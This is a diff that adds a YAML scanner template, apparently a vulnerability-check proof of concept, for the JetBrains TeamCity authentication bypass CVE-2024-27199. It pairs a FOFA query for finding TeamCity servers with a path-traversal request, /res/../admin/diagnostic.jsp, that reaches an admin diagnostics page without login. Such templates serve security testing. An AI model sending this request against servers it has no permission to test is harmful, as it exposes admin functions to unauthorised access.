@@ -1,0 +1,16 @@
+id: poc-yaml-jetbrains-teamcity-authentication-bypass
+info:
+  name: JetBrains TeamCity 身份验证绕过漏洞(CVE-2024-27199)
+  severity: critical
+  tags:
+  - CVE-2024-27199
+  - 失效的身份认证
+  finger: teamcity
+  fofa: title="TeamCity"
+requests:
+- method: GET
+  path: /res/../admin/diagnostic.jsp
+  expression: status_code == 200 && contains(body,"CPU usage (2 cores)") && contains(body,"Active
+    logging preset") && contains(body,"Save Thread Dump")
+variables: {}
+transport: http
